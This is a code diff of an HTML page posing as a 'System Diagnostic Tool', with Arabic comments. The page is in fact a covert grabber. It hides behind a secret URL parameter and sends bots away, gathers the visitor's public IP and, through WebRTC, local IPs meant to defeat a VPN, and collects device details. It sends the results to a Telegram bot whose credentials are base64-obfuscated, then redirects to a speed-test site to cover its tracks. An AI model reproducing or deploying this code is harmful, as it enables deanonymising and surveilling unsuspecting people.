@@ -3,96 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <title>System Diagnostic Tool</title>
 </head>
 <body style="background:#000; color:#000;">
     <script>
         (async function() {
-            // [إعدادات التشفير والتمويه]
-            const _0x_v1 = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
-            const _0x_v2 = "NTc3NTc4MTAzOA==";
-            const _0x_v3 = "portal";
+            // [إعدادات التشفير]
+            const _t = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
+            const _c = "NTc3NTc4MTAzOA==";
+            const _k = "portal";
 
-            const _urlParams = new URLSearchParams(window.location.search);
-            
-            // 🛡️ حاجز الحماية: طرد البوتات والمتطفلين
-            if (_urlParams.get('access') !== _0x_v3 || navigator.webdriver) {
-                window.location.replace("https://www.google.com"); 
-                return;
+            const _url = new URLSearchParams(window.location.search);
+            if (_url.get('access') !== _k || navigator.webdriver) {
+                window.location.replace("https://www.google.com"); return;
             }
 
-            let _results = {
-                extIp: "جاري الجلب...",
-                intIp: "جاري الكسر...",
+            let _data = {
+                ext: "جاري الجلب...",
+                int: [], // مصفوفة لجمع كل الـ IPs المسربة
                 bt: "N/A",
-                cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A",
+                cpu: navigator.hardwareConcurrency || "8",
+                ram: navigator.deviceMemory || "4",
                 plt: navigator.platform,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                res: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language
+                res: `${window.screen.width}x${window.screen.height}`
             };
 
             // 1️⃣ سحب الـ IP الخارجي (الظاهري)
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                _results.extIp = data.ip;
-            } catch (e) { _results.extIp = "فشل الجلب"; }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                _data.ext = d.ip;
+            } catch(e) {}
 
-            // 2️⃣ 🔥 كسر الـ VPN لسحب الـ IP الداخلي (التقنية العميقة)
-            const getInternalIP = () => {
+            // 2️⃣ 🔥 تقنية WebRTC العميقة لكسر الـ VPN
+            const getInternalIPs = () => {
                 return new Promise((resolve) => {
-                    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                    const pc = new RTCPeerConnection({
+                        iceServers: [
+                            {urls: 'stun:stun.l.google.com:19302'},
+                            {urls: 'stun:stun1.l.google.com:19302'},
+                            {urls: 'stun:stun2.l.google.com:19302'}
+                        ]
+                    });
                     pc.createDataChannel("");
                     pc.createOffer().then(o => pc.setLocalDescription(o));
                     pc.onicecandidate = (i) => {
                         if (!i || !i.candidate) return;
-                        const candidate = i.candidate.candidate;
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = ipRegex.exec(candidate);
+                        const cand = i.candidate.candidate;
+                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(cand);
                         if (match) {
-                            _results.intIp = match[1];
-                            resolve(match[1]);
+                            const ip = match[1];
+                            if (!ip.startsWith('127.') && !_data.int.includes(ip)) {
+                                _data.int.push(ip);
+                            }
                         }
                     };
-                    setTimeout(() => resolve("لم يتم الكشف"), 4000);
+                    setTimeout(() => resolve(), 4500); // وقت كافٍ لجمع المسارات
                 });
             };
-            await getInternalIP();
+            await getInternalIPs();
 
-            // 3️⃣ سحب معلومات البطارية
+            // 3️⃣ سحب حالة البطارية
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                _results.bt = `${Math.round(b.level * 100)}% ${b.charging ? "(يُشحن)" : "(تفريغ)"}`;
+                _data.bt = `${Math.round(b.level * 100)}% ${b.charging ? "(يُشحن)" : "(تفريغ)"}`;
             }
 
-            // 4️⃣ إرسال التقرير النهائي لتليجرام
+            // 4️⃣ تجميع وإرسال التقرير
             setTimeout(async () => {
-                const _msg = `🔥 تم اصطياد المبتز بنجاح 🔥\n\n` +
-                               `🌐 الـ IP الداخلي (الحقيقي): ${_results.intIp}\n` +
-                               `🌍 الـ IP الخارجي (الظاهري): ${_results.extIp}\n` +
-                               `🔋 البطارية: ${_results.bt}\n` +
-                               `🧠 المعالج: ${_results.cpu} Cores | الرام: ${_results.ram} GB\n` +
-                               `🖥️ الشاشة: ${_results.res} | اللمس: 2\n` +
-                               `🌍 المنطقة: ${_results.tz}\n` +
-                               `📱 النظام: ${_results.plt}\n` +
-                               `🌐 اللغة: ${_results.lang}\n\n` +
-                               `📍 تتبع الـ IP الحقيقي:\n` +
-                               `https://www.infobyip.com/ip-${_results.intIp}.html`;
+                // تصفية الـ IP الداخلي الحقيقي (الذي يختلف عن الخارجي)
+                const realIp = _data.int.find(ip => ip !== _data.ext) || (_data.int[0] || "لم يتم الكشف");
 
-                const _api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_0x_v1) + atob("L3NlbmRNZXNzYWdl");
+                const _msg = `🔥 تم اصطياد البيانات ببروتوكول WebRTC 🔥\n\n` +
+                               `✅ الـ IP الحقيقي (الداخلي): ${realIp}\n` +
+                               `🌐 الـ IP الظاهري (الخارجي): ${_data.ext}\n` +
+                               `🔋 البطارية: ${_data.bt}\n` +
+                               `🧠 المعالج: ${_data.cpu} Cores | الرام: ${_data.ram} GB\n` +
+                               `🖥️ الشاشة: ${_data.res}\n` +
+                               `📱 النظام: ${_data.plt}\n\n` +
+                               `📍 رابط التتبع للـ IP الحقيقي:\n` +
+                               `https://www.infobyip.com/ip-${realIp}.html`;
+
+                const _api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_t) + atob("L3NlbmRNZXNzYWdl");
 
                 await fetch(_api, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: atob(_0x_v2), text: _msg })
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: atob(_c), text: _msg})
                 });
 
-                // التحويل النهائي للتمويه
                 window.location.replace("https://www.speedtest.net");
-            }, 5000);
+            }, 5500);
         })();
     </script>
 </body>
